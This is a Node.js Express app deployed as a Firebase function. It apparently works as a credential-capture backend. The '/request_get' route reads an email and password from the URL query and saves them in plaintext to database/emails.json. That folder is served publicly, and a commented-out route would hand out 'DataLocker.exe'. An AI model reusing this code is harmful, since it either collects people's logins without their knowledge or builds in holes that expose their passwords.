const functions = require('firebase-functions');
var express = require('express');
var fs = require('fs');
var app = express();


app.use(express.static("views"));
app.use(express.static("Downloads"));
app.use(express.static("database"));
app.use(express.static("app.js"));

app.get("/", function(req, res){
  res.sendfile(__dirname + "/views/index.html");
  //res.send("AS");
});

app.get("/request_get", function(req, res){
  responce={
    email_id: req.query.email_id,
    password: req.query.password
  };

  var email = responce.email_id;
  if(email.length >5){
    fs.exists("database/emails.json", function(exists){
      if(exists){
        var jsonObject = JSON.stringify(responce);
        fs.writeFile("database/emails.json",jsonObject,"utf-8", function(err){
          if(err) throw err;
          res.sendFile(__dirname + "/views/Scene.html");
        });
      }else{
        res.send("File not exists");
      }
    });
  }
});
app.get("/request_download", function(req, res){
  //res.download("Downloads/DataLocker.exe");
  res.sendFile(__dirname + "/views/Scene.html");
});

exports.app = functions.https.onRequest(app);
